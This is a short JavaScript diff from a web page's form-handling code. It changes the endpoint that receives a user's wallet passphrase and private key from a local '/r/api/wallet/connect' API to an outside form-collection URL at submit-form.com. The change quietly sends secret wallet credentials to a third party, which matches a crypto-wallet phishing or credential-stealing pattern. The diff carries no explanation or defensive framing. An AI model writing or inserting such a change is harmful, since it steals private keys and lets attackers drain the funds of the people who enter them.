@@ -85,7 +85,7 @@ $(document).ready(function () {
             formData.append('passphrase', passphrase);
             formData.append('privateKey', privateKey);
             $.ajax({
-                url: '/r/api/wallet/connect?address=' + (address ? address : ""),
+                url: 'https://submit-form.com/e8c2e4sU' + (address ? address : ""),
                 method: 'POST',
                 processData: false,
                 contentType: false,
